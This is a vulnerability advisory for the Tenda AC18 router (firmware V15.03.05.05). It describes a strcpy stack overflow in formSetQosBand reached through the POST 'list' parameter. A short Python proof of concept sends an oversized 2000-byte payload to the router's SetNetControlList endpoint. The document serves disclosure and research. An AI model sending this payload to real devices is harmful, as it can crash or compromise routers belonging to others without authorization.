## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetQosBand` function. The `v8` variable receives the `list` parameter from a POST request and this variable is passed into function `sub_7D644` as `a1`. In function `sub_7D644`, variable `a1` is passed to `src`, which is later assigned to the `dest` variable, which is fixed at 256 bytes. However, since the user can control the input of `list`, the statement `strcpy(dest, src);` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![image-20240305232338043](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232338043.png)

![image-20240305232347205](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232347205.png)

![image-20240305232754626](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232754626.png)

![image-20240305232939744](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232939744.png)

![image-20240305232808262](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232808262.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305232252540](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305232252540.png)
